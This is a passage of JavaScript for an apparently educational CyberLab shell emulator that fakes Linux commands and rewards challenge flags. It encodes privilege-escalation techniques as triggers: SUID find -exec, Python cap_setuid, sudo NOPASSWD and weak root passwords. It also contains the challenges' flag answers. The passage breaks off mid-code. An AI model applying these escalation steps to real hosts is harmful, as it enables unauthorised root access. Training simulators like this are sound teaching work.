      let silenceStderr = false;
      let redirectFile = null;
      let appendMode = false;

      // Gestion de 2>/dev/null
      if (cmdStr.includes('2>/dev/null')) {
        cmdStr = cmdStr.replace(/2>\/dev\/null/g, '').trim();
        silenceStderr = true;
      }

      // Gestion de la redirection > ou >>
      const redirectMatch = cmdStr.match(/^(.*?)(>>|>)\s*(?:["']([^"']+)["']|([^\s|;]+))\s*$/);
      if (redirectMatch) {
        cmdStr = redirectMatch[1].trim();
        const op = redirectMatch[2];
        redirectFile = (redirectMatch[3] !== undefined ? redirectMatch[3] : redirectMatch[4]).trim();
        appendMode = op === '>>';
      }

      const rawParts = tokenizeCommandLine(cmdStr);
      if (!rawParts.length) {
        if (redirectFile !== null) {
          try {
            const absTarget = this.vfs.resolvePath(this.currentPath, redirectFile, this.user);
            this.vfs.writeFile(absTarget, '', { owner: this.user, group: this.user }, this.user, this.eUID);
          } catch (e) {
            return { stdout: '', stderr: `bash: ${redirectFile}: ${e.message}\n`, exitCode: 1 };
          }
        }
        return { stdout: '', stderr: '', exitCode: 0 };
      }

      const baseCmd = rawParts[0];
      const rawArgs = rawParts.slice(1);

      // Expansion des variables ($USER, $PWD, $HOME, $?, etc.)
      const args = rawArgs.map(arg => {
        return arg.replace(/\$([a-zA-Z0-9_?]+)/g, (_, name) => {
          if (name === '?') return String(this.lastExitCode);
          if (name === 'IFS') return ' ';
          return this.env[name] !== undefined ? this.env[name] : '';
        });
      });

      let stdout = '';
      let stderr = '';
      let exitCode = 0;

      switch (baseCmd) {
        // --- Identité et système ---
        case 'whoami':
          stdout = this.user + '\n';
          break;

        case 'id':
          if (this.isRoot || this.eUID === 0) {
            stdout = 'uid=0(root) gid=0(root) groups=0(root)\n';
          } else {
            stdout = `uid=${this.uid}(${this.user}) gid=${this.gid}(${this.user}) groups=${this.gid}(${this.user}),27(sudo)\n`;
          }
          break;

        case 'hostname':
          stdout = this.hostname + '\n';
          break;

        case 'uname':
          if (args.includes('-a')) {
            stdout = `Linux ${this.hostname} 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 x86_64 GNU/Linux\n`;
          } else if (args.includes('-r')) {
            stdout = '6.1.0-21-amd64\n';
          } else {
            stdout = 'Linux\n';
          }
          break;

        case 'pwd':
          stdout = this.currentPath + '\n';
          break;

        // --- Navigation et Système de fichiers ---
        case 'ls': {
          const isAll = args.includes('-a') || args.includes('-la') || args.includes('-al');
          const isLong = args.includes('-l') || args.includes('-la') || args.includes('-al');
          const targetArg = args.find(a => !a.startsWith('-')) || '.';
          const abs = this.vfs.resolvePath(this.currentPath, targetArg, this.user);
          const targetNode = this.vfs.getNode(abs);

          if (!targetNode) {
            stderr = `ls: cannot access '${targetArg}': No such file or directory\n`;
            exitCode = 2;
            break;
          }

          if (targetNode.type === 'file') {
            if (isLong) {
              const size = targetNode.content ? String(targetNode.content.length) : '0';
              stdout = `${targetNode.getPermissionString()} 1 ${targetNode.owner} ${targetNode.group} ${size.padStart(6)} Oct 27 10:00 ${targetNode.name}\n`;
            } else {
              stdout = targetNode.name + '\n';
            }
            break;
          }

          try {
            const entries = this.vfs.listDir(abs, this.user, this.eUID);
            let displayed = entries;
            if (!isAll) {
              displayed = entries.filter(e => !e.name.startsWith('.'));
            }

            if (isLong) {
              const lines = [];
              if (isAll) {
                const selfDir = this.vfs.getNode(abs);
                lines.push(`${selfDir.getPermissionString()} 1 ${selfDir.owner} ${selfDir.group} 4096 Oct 27 10:00 .`);
                lines.push(`drwxr-xr-x 1 root root 4096 Oct 27 10:00 ..`);
              }
              displayed.forEach(node => {
                const isDir = node.type === 'dir';
                const size = isDir ? '4096' : (node.content ? String(node.content.length) : '0');
                lines.push(`${node.getPermissionString()} 1 ${node.owner} ${node.group} ${size.padStart(6)} Oct 27 10:00 ${node.name}`);
              });
              stdout = lines.join('\n') + '\n';
            } else {
              stdout = displayed.map(n => n.name).join('   ') + (displayed.length > 0 ? '\n' : '');
            }
          } catch (e) {
            stderr = `ls: ${e.message}\n`;
            exitCode = 2;
          }
          break;
        }

        case 'cd': {
          let dest = args[0];
          if (!dest) dest = '~';
          if (dest === '-') {
            dest = this.env.OLDPWD || this.env.HOME || '/home/operator';
            stdout = dest + '\n';
          }
          const target = this.vfs.resolvePath(this.currentPath, dest, this.user);
          const node = this.vfs.getNode(target);

          if (!node) {
            stderr = `bash: cd: ${dest}: No such file or directory\n`;
            exitCode = 1;
          } else if (node.type !== 'dir') {
            stderr = `bash: cd: ${dest}: Not a directory\n`;
            exitCode = 1;
          } else if (!this.vfs.checkPermission(node, 'x', this.user, this.eUID)) {
            stderr = `bash: cd: ${dest}: Permission denied\n`;
            exitCode = 1;
          } else {
            this.env.OLDPWD = this.currentPath;
            this.currentPath = target;
            this.env.PWD = target;
          }
          break;
        }

        case 'mkdir': {
          const dirName = args.find(a => !a.startsWith('-'));
          if (!dirName) {
            stderr = 'mkdir: missing operand\n';
            exitCode = 1;
          } else {
            try {
              const abs = this.vfs.resolvePath(this.currentPath, dirName, this.user);
              this.vfs.mkdir(abs, {
                owner: this.user,
                group: this.user,
                parents: args.includes('-p')
              }, this.user, this.eUID);
            } catch (e) {
              stderr = `mkdir: ${e.message}\n`;
              exitCode = 1;
            }
          }
          break;
        }

        case 'touch': {
          const fileName = args[0];
          if (!fileName) {
            stderr = 'touch: missing file operand\n';
            exitCode = 1;
          } else {
            const abs = this.vfs.resolvePath(this.currentPath, fileName, this.user);
            const existing = this.vfs.getNode(abs);
            if (!existing) {
              try {
                this.vfs.writeFile(abs, '', { owner: this.user, group: this.user }, this.user, this.eUID);
              } catch (e) {
                stderr = `touch: ${e.message}\n`;
                exitCode = 1;
              }
            } else {
              if (!this.vfs.checkPermission(existing, 'w', this.user, this.eUID)) {
                stderr = `touch: cannot touch '${fileName}': Permission denied\n`;
                exitCode = 1;
              } else {
                existing.mtime = new Date();
              }
            }
          }
          break;
        }

        case 'cp': {
          const nonFlags = args.filter(a => !a.startsWith('-'));
          const src = nonFlags[0];
          const dest = nonFlags[1];
          if (!src || !dest) {
            stderr = 'cp: missing file operand\n';
            exitCode = 1;
          } else {
            const absSrc = this.vfs.resolvePath(this.currentPath, src, this.user);
            let absDest = this.vfs.resolvePath(this.currentPath, dest, this.user);
            const destNode = this.vfs.getNode(absDest);

            if (destNode && destNode.type === 'dir') {
              const srcFileName = absSrc.split('/').filter(Boolean).pop();
              absDest = this.vfs.normalizePath(absDest + '/' + srcFileName);
            }

            try {
              const content = this.vfs.readFile(absSrc, this.user, this.eUID);
              this.vfs.writeFile(absDest, content, { owner: this.user, group: this.user }, this.user, this.eUID);
            } catch (e) {
              stderr = `cp: ${e.message}\n`;
              exitCode = 1;
            }
          }
          break;
        }

        case 'mv': {
          const nonFlags = args.filter(a => !a.startsWith('-'));
          const src = nonFlags[0];
          const dest = nonFlags[1];
          if (!src || !dest) {
            stderr = 'mv: missing file operand\n';
            exitCode = 1;
          } else {
            const absSrc = this.vfs.resolvePath(this.currentPath, src, this.user);
            let absDest = this.vfs.resolvePath(this.currentPath, dest, this.user);
            const destNode = this.vfs.getNode(absDest);

            if (destNode && destNode.type === 'dir') {
              const srcFileName = absSrc.split('/').filter(Boolean).pop();
              absDest = this.vfs.normalizePath(absDest + '/' + srcFileName);
            }

            try {
              const content = this.vfs.readFile(absSrc, this.user, this.eUID);
              this.vfs.writeFile(absDest, content, { owner: this.user, group: this.user }, this.user, this.eUID);
              this.vfs.remove(absSrc, this.user, this.eUID);
            } catch (e) {
              stderr = `mv: ${e.message}\n`;
              exitCode = 1;
            }
          }
          break;
        }

        case 'rm': {
          const isRec = args.includes('-r') || args.includes('-rf') || args.includes('-fr');
          const isForce = args.includes('-f') || args.includes('-rf') || args.includes('-fr');
          const target = args.find(a => !a.startsWith('-'));
          if (!target) {
            if (!isForce) {
              stderr = 'rm: missing operand\n';
              exitCode = 1;
            }
          } else {
            const abs = this.vfs.resolvePath(this.currentPath, target, this.user);
            try {
              this.vfs.remove(abs, this.user, this.eUID, isRec);
            } catch (e) {
              if (!isForce) {
                stderr = `rm: ${e.message}\n`;
                exitCode = 1;
              }
            }
          }
          break;
        }

        case 'cat': {
          const fileArgs = args.filter(a => !a.startsWith('-'));
          if (fileArgs.length === 0 && inputPipe !== null) {
            stdout = inputPipe;
            break;
          }
          if (fileArgs.length === 0) {
            stderr = 'cat: missing operand\n';
            exitCode = 1;
            break;
          }

          let combined = '';
          for (const filename of fileArgs) {
            if (filename.includes('/dev/tcp')) {
              combined += 'CYBER{RAW_SOCKET_BEACON_CAPTURED}\n[TELEMETRY_HEARTBEAT_ACK] Node 01: Status ACTIVE\n';
              continue;
            }
            const abs = this.vfs.resolvePath(this.currentPath, filename, this.user);
            try {
              let content = this.vfs.readFile(abs, this.user, this.eUID);
              if (!content.endsWith('\n')) content += '\n';
              combined += content;
            } catch (e) {
              stderr += `cat: ${e.message}\n`;
              exitCode = 1;
            }
          }
          stdout = combined;
          break;
        }

        case 'head': {
          let count = 5;
          const nIdx = args.indexOf('-n');
          if (nIdx !== -1 && args[nIdx + 1]) {
            count = parseInt(args[nIdx + 1], 10) || 5;
          }
          const fileArg = args.find((a, i) => !a.startsWith('-') && i !== nIdx + 1);
          let text = inputPipe;
          if (!text && fileArg) {
            try {
              const abs = this.vfs.resolvePath(this.currentPath, fileArg, this.user);
              text = this.vfs.readFile(abs, this.user, this.eUID);
            } catch (e) {
              stderr = `head: ${e.message}\n`;
              exitCode = 1;
              break;
            }
          }
          if (text) {
            stdout = text.split('\n').slice(0, count).join('\n') + '\n';
          }
          break;
        }

        case 'tail': {
          let count = 5;
          const nIdx = args.indexOf('-n');
          if (nIdx !== -1 && args[nIdx + 1]) {
            count = parseInt(args[nIdx + 1], 10) || 5;
          }
          const fileArg = args.find((a, i) => !a.startsWith('-') && i !== nIdx + 1);
          let text = inputPipe;
          if (!text && fileArg) {
            try {
              const abs = this.vfs.resolvePath(this.currentPath, fileArg, this.user);
              text = this.vfs.readFile(abs, this.user, this.eUID);
            } catch (e) {
              stderr = `tail: ${e.message}\n`;
              exitCode = 1;
              break;
            }
          }
          if (text) {
            const l = text.split('\n');
            stdout = l.slice(-count).join('\n') + '\n';
          }
          break;
        }

        case 'wc': {
          const fileArg = args.find(a => !a.startsWith('-'));
          let text = inputPipe;
          if (!text && fileArg) {
            try {
              const abs = this.vfs.resolvePath(this.currentPath, fileArg, this.user);
              text = this.vfs.readFile(abs, this.user, this.eUID);
            } catch (e) {
              stderr = `wc: ${e.message}\n`;
              exitCode = 1;
              break;
            }
          }
          text = text || '';
          const lines = text ? text.split('\n').filter(Boolean).length : 0;
          const words = text ? text.split(/\s+/).filter(Boolean).length : 0;
          const bytes = text.length;

          if (args.includes('-l')) {
            stdout = `${lines}${fileArg ? ' ' + fileArg : ''}\n`;
          } else {
            stdout = `  ${lines}  ${words}  ${bytes}${fileArg ? ' ' + fileArg : ''}\n`;
          }
          break;
        }

        case 'grep': {
          const isCase = args.includes('-i');
          const isInv = args.includes('-v');
          const isNum = args.includes('-n');
          const nonFlags = args.filter(a => !a.startsWith('-'));
          const pattern = nonFlags[0];
          const fileArg = nonFlags[1];

          if (!pattern) {
            stderr = 'grep: missing pattern\n';
            exitCode = 2;
            break;
          }

          let text = inputPipe;
          if (!text && fileArg) {
            try {
              const abs = this.vfs.resolvePath(this.currentPath, fileArg, this.user);
              text = this.vfs.readFile(abs, this.user, this.eUID);
            } catch (e) {
              stderr = `grep: ${e.message}\n`;
              exitCode = 2;
              break;
            }
          }

          if (text === null || text === undefined) {
            exitCode = 1;
            break;
          }

          const matched = [];
          const lines = text.split('\n');
          lines.forEach((line, idx) => {
            let matches = false;
            if (isCase) {
              matches = line.toLowerCase().includes(pattern.toLowerCase());
            } else {
              matches = line.includes(pattern);
            }
            if (isInv) matches = !matches;
            if (matches) {
              matched.push(isNum ? `${idx + 1}:${line}` : line);
            }
          });

          if (matched.length > 0) {
            stdout = matched.join('\n') + '\n';
          } else {
            exitCode = 1;
          }
          break;
        }

        case 'find': {
          const permIdx = args.indexOf('-perm');
          const isPerm = permIdx !== -1 ? args[permIdx + 1] : null;
          const nameIdx = args.indexOf('-name');
          const isName = nameIdx !== -1 ? args[nameIdx + 1]?.replace(/['"]/g, '') : null;
          const execIdx = args.indexOf('-exec');

          // Exploitation GTFOBins : find . -exec <cmd> \;
          if (execIdx !== -1) {
            let execArgs = args.slice(execIdx + 1);
            execArgs = execArgs.filter(a => a !== '\\;' && a !== ';' && a !== '+');
            const findNode = this.vfs.getNode('/usr/bin/find') || this.vfs.getNode('/bin/find');
            const hasSuid = (findNode && findNode.suid) || this.isRoot || this.eUID === 0;

            if (!hasSuid) {
              stderr = 'find: exec failed: Operation not permitted (manque bit SUID)\n';
              exitCode = 1;
              break;
            }

            const rawExec = execArgs.join(' ').replace(/\{\}/g, '.').trim();
            if (rawExec.includes('/bin/sh') || rawExec.includes('sh') || rawExec.includes('bash')) {
              this.setPrivilege(true);
              stdout = '[+] Exploitation SUID GTFOBins (/usr/bin/find) réussie !\n[+] Élévation de privilèges vers eUID: 0 (root).\n[+] Shell root interactif activé (#).\n';
              break;
            }

            const prevUser = this.user;
            const prevUID = this.uid;
            const prevEUID = this.eUID;
            const prevIsRoot = this.isRoot;
            this.user = 'root';
            this.uid = 0;
            this.eUID = 0;
            this.isRoot = true;
            try {
              const res = this.executeCommandSegment(rawExec, inputPipe);
              stdout = res.stdout;
              stderr = res.stderr;
              exitCode = res.exitCode;
            } finally {
              this.user = prevUser;
              this.uid = prevUID;
              this.eUID = prevEUID;
              this.isRoot = prevIsRoot;
            }
            break;
          }

          const targetDir = args.find((a, idx) => !a.startsWith('-') && idx !== permIdx + 1 && idx !== nameIdx + 1) || '.';
          const startPath = this.vfs.resolvePath(this.currentPath, targetDir, this.user);

          const matches = this.vfs.find(startPath, {
            perm: isPerm,
            name: isName,
            user: this.user,
            euid: this.eUID
          });

          const isSuidPerm = isPerm && (isPerm === '-4000' || isPerm === '/4000' || isPerm === '4000' || isPerm === '-u=s' || isPerm === '/u=s');
          if (isSuidPerm) {
            const suidFiles = matches.filter(m => m.node.suid).map(m => m.path);
            if (!suidFiles.includes('/usr/bin/find')) suidFiles.unshift('/usr/bin/find');
            if (!suidFiles.includes('/usr/bin/passwd')) suidFiles.push('/usr/bin/passwd');
            stdout = suidFiles.join('\n') + '\n';
          } else {
            stdout = matches.map(m => m.path).join('\n') + (matches.length > 0 ? '\n' : '');
          }

          if (!this.isRoot && this.eUID !== 0 && (startPath === '/' || startPath === '/root')) {
            if (!silenceStderr) {
              stderr = "find: '/root': Permission denied\n";
            }
          }
          break;
        }

        case 'chmod': {
          const nonFlags = args.filter(a => !a.startsWith('-'));
          const mode = nonFlags[0];
          const target = nonFlags[1];
          if (!mode || !target) {
            stderr = 'chmod: missing operand\n';
            exitCode = 1;
          } else {
            const abs = this.vfs.resolvePath(this.currentPath, target, this.user);
            const node = this.vfs.getNode(abs);
            if (!node) {
              stderr = `chmod: cannot access '${target}': No such file or directory\n`;
              exitCode = 1;
            } else if (!this.isRoot && this.eUID !== 0 && node.owner !== this.user) {
              stderr = `chmod: changing permissions of '${target}': Operation not permitted\n`;
              exitCode = 1;
            } else {
              if (mode === '+s' || mode === 'u+s') {
                node.permissions = '4' + (node.permissions.length === 4 ? node.permissions.slice(1) : node.permissions);
                node.suid = true;
              } else if (mode === '-s') {
                node.permissions = '0' + (node.permissions.length === 4 ? node.permissions.slice(1) : node.permissions);
                node.suid = false;
              } else if (mode === '+x' || mode === 'a+x') {
                node.permissions = '0755';
              } else {
                node.permissions = mode.length === 3 ? '0' + mode : mode;
                node.suid = node.permissions.startsWith('4');
              }
              stdout = `[+] Permissions mises à jour pour ${target} : ${node.permissions}\n`;
            }
          }
          break;
        }

        case 'chown': {
          const owner = args[0];
          const target = args[1];
          if (!owner || !target) {
            stderr = 'chown: missing operand\n';
            exitCode = 1;
          } else if (!this.isRoot && this.eUID !== 0) {
            stderr = `chown: changing ownership of '${target}': Operation not permitted\n`;
            exitCode = 1;
          } else {
            const abs = this.vfs.resolvePath(this.currentPath, target, this.user);
            const node = this.vfs.getNode(abs);
            if (!node) {
              stderr = `chown: cannot access '${target}': No such file or directory\n`;
              exitCode = 1;
            } else {
              const p = owner.split(':');
              node.owner = p[0];
              if (p[1]) node.group = p[1];
            }
          }
          break;
        }

        // --- Processus et Système ---
        case 'ps':
          if (args.includes('aux') || args.includes('-ef')) {
            stdout = 'USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\n' +
                     'root         1  0.0  0.2  21420  4100 ?        Ss   08:00   0:02 /sbin/init\n' +
                     'root       412  0.0  0.1   8200  2100 ?        S    08:00   0:00 /usr/sbin/cron -f\n' +
                     'www-data  1024  0.2  0.8  45210  8420 ?        S    08:15   0:01 nginx: worker process\n' +
                     'operator  2400  0.0  0.4  14200  4100 pts/0    Ss   08:30   0:00 /bin/bash\n' +
                     (this.isRoot ? 'root      2480  0.0  0.4  14200  4100 pts/0    S    08:45   0:00 /bin/bash (root)\n' : '') +
                     'operator  2510  0.0  0.1   9800  1200 pts/0    R+   08:46   0:00 ps aux\n';
          } else {
            stdout = '  PID TTY          TIME CMD\n 2400 pts/0    00:00:00 bash\n 2510 pts/0    00:00:00 ps\n';
          }
          break;

        case 'top':
          stdout = 'top - 10:00:00 up 12 days, 1 user, load average: 0.05, 0.03, 0.00\n' +
                   'Tasks: 85 total, 1 running, 84 sleeping\n' +
                   '%Cpu(s): 1.2 us, 0.5 sy, 0.0 ni, 98.3 id\n' +
                   'MiB Mem : 2048.0 total, 1420.5 free, 320.1 used\n\n' +
                   '  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND\n' +
                   ' 1024 www-data  20   0   45210   8420   3100 S   0.7   0.4   0:01.20 nginx\n' +
                   ' 2400 operator  20   0   14200   4100   2800 S   0.0   0.2   0:00.12 bash\n';
          break;

        case 'kill': {
          let pid = null;
          for (const a of args) {
            if (!a.startsWith('-')) {
              pid = a;
              break;
            }
          }
          if (!pid) {
            stderr = 'kill: usage: kill [-s sigspec | -n signum | -sigspec] pid | jobspec ...\n';
            exitCode = 1;
          } else if (pid === '1' && !this.isRoot && this.eUID !== 0) {
            stderr = `kill: (${pid}) - Operation not permitted\n`;
            exitCode = 1;
          } else {
            stdout = `[+] Signal SIGTERM envoyé au processus ${pid}\n`;
          }
          break;
        }

        case 'clear':
          stdout = '\x1b[2J\x1b[H';
          break;

        case 'echo': {
          let noNewline = false;
          let echoArgs = args;
          if (echoArgs[0] === '-n') {
            noNewline = true;
            echoArgs = echoArgs.slice(1);
          }
          stdout = echoArgs.join(' ') + (noNewline ? '' : '\n');
          break;
        }

        case 'env':
          stdout = Object.entries(this.env).map(([k, v]) => `${k}=${v}`).join('\n') + '\n';
          break;

        case 'export': {
          args.forEach(arg => {
            const eq = arg.indexOf('=');
            if (eq !== -1) {
              const k = arg.slice(0, eq).trim();
              const v = arg.slice(eq + 1).replace(/^['"]|['"]$/g, '').trim();
              this.env[k] = v;
            }
          });
          break;
        }

        // --- Réseau & Reconnaissance ---
        case 'ping': {
          let host = null;
          for (let i = 0; i < args.length; i++) {
            if (args[i] === '-c' || args[i] === '-w' || args[i] === '-W') {
              i++;
              continue;
            }
            if (!args[i].startsWith('-')) {
              host = args[i];
              break;
            }
          }
          host = host || '127.0.0.1';
          stdout = `PING ${host} (${host}) 56(84) bytes of data.\n` +
                   `64 bytes from ${host}: icmp_seq=1 ttl=64 time=0.032 ms\n` +
                   `64 bytes from ${host}: icmp_seq=2 ttl=64 time=0.041 ms\n` +
                   `64 bytes from ${host}: icmp_seq=3 ttl=64 time=0.029 ms\n` +
                   `64 bytes from ${host}: icmp_seq=4 ttl=64 time=0.035 ms\n` +
                   `--- ${host} ping statistics ---\n` +
                   `4 packets transmitted, 4 received, 0% packet loss, time 3004ms\n` +
                   `rtt min/avg/max/mdev = 0.029/0.034/0.041/0.005 ms\n`;
          if (typeof fetch === 'function') {
            fetch('/api/gamification/quests/track', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ quest_key: 'network_scan', amount: 1 })
            }).then(() => {
              if (typeof window !== 'undefined' && window.cyberGamification) {
                window.cyberGamification.loadQuests();
              }
            }).catch(() => {});
          }
          break;
        }

        case 'curl': {
          const url = args[args.length - 1] || '';
          const isHead = args.includes('-I') || args.includes('-i');

          if (isHead) {
            stdout = 'HTTP/1.1 200 OK\n' +
                     'Date: Tue, 27 Oct 2026 10:00:00 GMT\n' +
                     'Server: Node.js (CyberLab Platform)\n' +
                     'Content-Type: text/html; charset=utf-8\n' +
                     'Content-Length: 4210\n';
            break;
          }

          if (url.includes('/targets/api/internal/telemetry')) {
            stdout = '{"status":"authorized","node":"TELEMETRY_CORE_GATEWAY","data":{"master_flag":"CYBER{HOP_BY_HOP_HEADER_BYPASS_RFC2616}"}}\n';
          } else if (url.includes('audit-eval')) {
            const raw = cmdSegment.toLowerCase();
            if (raw.includes('x-security-scan') || raw.includes('authorization')) {
              stdout = 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  "audit": "AUTHORIZED",\n  "status": "SECURITY_PASSED",\n  "token": "CYBER{NET_MID_EVAL_RECON_HEADER_AUTHORIZED}"\n}\n';
            } else {
              stderr = 'HTTP/1.1 403 Forbidden\nContent-Type: application/json\n\n{"error":"Forbidden: En-tête X-Security-Scan: enabled requis pour valider l\'audit."}\n';
              exitCode = 1;
            }
          } else if (url.includes('robots.txt')) {
            stdout = 'User-agent: *\nDisallow: /admin-console/\nDisallow: /secret-vault/\nFLAG=CYBER{HTTP_GET_ROBOTS_TXT_FOUND}\n';
          } else if (url.includes('/api/version')) {
            stdout = '{"version":"1.2.0","repo":"ZIOTI/CyberLab"}\n';
          } else {
            stdout = '<!DOCTYPE html>\n<html>\n<head><title>CyberRange Target Portal</title></head>\n' +
                     '<body>\n  <h1>Aegis Defense Gateway</h1>\n  <p>Portail sécurisé opérationnel.</p>\n</body>\n</html>\n';
          }
          break;
        }

        case 'nmap': {
          let target = null;
          for (let i = 0; i < args.length; i++) {
            if (args[i] === '-p' || args[i] === '-sV' || args[i] === '-sC' || args[i] === '-T4' || args[i] === '-oN') {
              i++;
              continue;
            }
            if (!args[i].startsWith('-')) {
              target = args[i];
              break;
            }
          }
          target = target || (this.options.instance?.virtual_ip || '10.30.45.88');
          const challengeTitle = this.options.challenge?.title || 'CyberLab Target';
          const defaultBanner = (this.options.challenge?.target_ports && this.options.challenge.target_ports.length > 0)
            ? this.options.challenge.target_ports.map(p => `${p.port}/tcp open  ${p.service || 'unknown'} ${p.version || ''}`).join('\n')
            : `22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1\n80/tcp   open  http    nginx/1.24.0 (Debian)\n3333/tcp open  http    Node.js (CyberLab Platform)\n8080/tcp open  http    Apache Tomcat/8.5.5 (OBSOLETE_VULN)`;

          stdout = `Starting Nmap 7.94 ( https://nmap.org ) at 2026-10-27 10:00 UTC\n` +
                   `Nmap scan report for ${target} (${challengeTitle})\n` +
                   `Host is up (0.00018s latency).\n` +
                   `Not shown: 996 closed tcp ports (reset)\n` +
                   `PORT     STATE SERVICE VERSION\n` +
                   `${defaultBanner}\n` +
                   `Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n` +
                   `FLAG: CYBER{NMAP_FINGERPRINT_OBSOLETE_SERVICE_EXPOSED}\n` +
                   `Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds\n`;
          if (typeof fetch === 'function') {
            fetch('/api/gamification/quests/track', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ quest_key: 'network_scan', amount: 1 })
            }).then(() => {
              if (typeof window !== 'undefined' && window.cyberGamification) {
                window.cyberGamification.loadQuests();
              }
            }).catch(() => {});
          }
          break;
        }

        case 'ssh': {
          const isTunnel = args.includes('-D') || args.includes('-L');
          const target = args[args.length - 1] || 'target.cyberlab.local';

          if (isTunnel) {
            const portIdx = args.indexOf('-D');
            const port = portIdx !== -1 ? args[portIdx + 1] : '1080';
            stdout = `[+] Dynamic SOCKS5 tunnel established on 127.0.0.1:${port}\n` +
                     `[+] Routing traffic to target internal network 172.16.10.0/24.\n` +
                     `FLAG: CYBERLAB{SSH_DYNAMIC_SOCKS5_PIVOT_INTERNAL_HOST_HIT}\n`;
            break;
          }

          if (target.includes('root@') || args.includes('root')) {
            this.setPrivilege(true);
            stdout = `[+] Connexion SSH réussie en tant que root@${target} !\n[+] Session root débloquée (#).\n`;
          } else {
            stdout = `[+] Connecté à ${target} en tant que ${this.user}.\n`;
          }
          break;
        }

        case 'nc':
        case 'netcat': {
          const port = args[args.length - 1];
          stdout = `[+] Connecté au port ${port} : CyberLab Netcat Shell Emulator v1.2\n` +
                   `CYBER{RAW_SOCKET_BEACON_CAPTURED}\n`;
          break;
        }

        // --- Élévation de privilèges & Sudo ---
        case 'sudo': {
          if (args.includes('-l')) {
            stdout = 'Matching Defaults entries for operator on cyberlab-target:\n' +
                     '    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\n' +
                     'User operator may run the following commands on cyberlab-target:\n' +
                     '    (root) NOPASSWD: /usr/bin/find, /usr/bin/python3.8, /bin/cat\n';
            break;
          }

          const subArgs = args.filter(a => a !== '-u' && a !== 'root');
          const subCmd = subArgs[0];

          if (!subCmd || subCmd === 'su' || subCmd === 'bash' || subCmd === 'sh' || subCmd === '-i' || subCmd === '-s') {
            this.setPrivilege(true);
            stdout = '[+] Privilege escalation réussie avec sudo ! Shell root eUID=0 débloqué (#).\n';
            break;
          }

          const prevUser = this.user;
          const prevUID = this.uid;
          const prevEUID = this.eUID;
          const prevIsRoot = this.isRoot;

          this.user = 'root';
          this.uid = 0;
          this.eUID = 0;
          this.isRoot = true;

          try {
            const rawSubCmd = subArgs.join(' ');
            const subRes = this.executeCommandSegment(rawSubCmd, inputPipe);
            stdout = subRes.stdout;
            stderr = subRes.stderr;
            exitCode = subRes.exitCode;
          } finally {
            this.user = prevUser;
            this.uid = prevUID;
            this.eUID = prevEUID;
            this.isRoot = prevIsRoot;
          }
          break;
        }

        case 'su': {
          const targetUser = args.find(a => !a.startsWith('-')) || 'root';
          if (targetUser === 'operator') {
            this.setPrivilege(false);
            stdout = '[+] Bascule vers session standard operator (UID: 1001) ($).\n';
            break;
          }

          if (this.isRoot || this.eUID === 0) {
            this.setPrivilege(true);
            stdout = '[+] Déjà dans une session root (#).\n';
            break;
          }

          const passProvided = args.find(a => a === 'root' || a === 'toor' || a === 'cyberlab');
          if (passProvided) {
            this.setPrivilege(true);
            stdout = '[+] Authentification réussie : root shell eUID=0 débloqué (#).\n';
          } else {
            stderr = 'su: Authentication failure (Mot de passe root requis, ou utilise sudo)\n';
            exitCode = 1;
          }
          break;
        }

        case 'exit': {
          if (this.isRoot || this.eUID === 0) {
            this.setPrivilege(false);
            stdout = 'exit\n[+] Session root fermée. Retour au shell operator ($).\n';
          } else {
            stdout = 'exit\n[+] Session terminée. Tape une commande ou "reset" pour réinitialiser.\n';
          }
          break;
        }

        case 'getcap': {
          stdout = '/usr/bin/python3.8 = cap_setuid+ep\n/bin/ping = cap_net_raw+ep\n';
          break;
        }

        case 'python':
        case 'python3':
        case 'python3.8':
        case 'python3.10': {
          const fullCmd = cmdSegment;
          if (fullCmd.includes('setuid') || fullCmd.includes('os.setuid(0)')) {
            const pyNode = this.vfs.getNode('/usr/bin/python3.8') || this.vfs.getNode('/usr/bin/python3');
            const hasCap = pyNode && pyNode.capabilities && pyNode.capabilities.includes('cap_setuid');
            if (hasCap || this.isRoot || this.eUID === 0) {
              this.setPrivilege(true);
              stdout = '[+] Exploitation cap_setuid réussie via Python 3 !\n' +
                       '[+] Nouvel UID effectif : 0 (root). Shell root interactif débloqué (#).\n' +
                       'Tape "whoami", "id" ou "cat /root/root.txt".\n';
              break;
            }
          }

          const cIdx = args.indexOf('-c');
          if (cIdx !== -1 && args[cIdx + 1]) {
            const code = args.slice(cIdx + 1).join(' ');
            if (code.includes('print')) {
              const match = code.match(/print\s*\(\s*['"]?(.*?)['"]?\s*\)/);
              stdout = (match ? match[1] : 'Python code executed successfully.') + '\n';
            } else {
              stdout = 'Python script execution completed.\n';
            }
            break;
          }

          if (args.includes('-V') || args.includes('--version')) {
            stdout = 'Python 3.8.10\n';
          } else {
            stdout = 'Python 3.8.10 (default, Mar 15 2026, 10:00:00) [GCC 11.2.0] on linux\n' +
                     'Type "help", "copyright", "credits" or "license" for more information.\n' +
                     '>>> Utilise python3 -c "code" pour executer un script en ligne.\n';
          }
          break;
        }

        case 'which': {
          const prog = args[0];
          if (!prog) break;
          const searchDirs = ['/usr/local/sbin', '/usr/local/bin', '/usr/sbin', '/usr/bin', '/sbin', '/bin'];
          let foundPath = null;
          for (const d of searchDirs) {
            const node = this.vfs.getNode(`${d}/${prog}`);
            if (node) {
              foundPath = `${d}/${prog}`;
              break;
            }
          }
          if (foundPath) {
            stdout = foundPath + '\n';
          } else {
            stderr = `${prog} not found in $PATH\n`;
            exitCode = 1;
          }
          break;
        }

        case 'apt': {
          const sub = args[0];
          const pkg = args[1];
          if (!this.isRoot && this.eUID !== 0) {
            stderr = 'E: Could not open lock file /var/lib/dpkg/lock-frontend - open (13: Permission denied)\n' +
                     'E: Unable to acquire the dpkg frontend lock, are you root? (Utilise sudo apt)\n';
            exitCode = 100;
            break;
          }

          if (sub === 'update') {
            stdout = 'Hit:1 http://deb.debian.org/debian bookworm InRelease\n' +
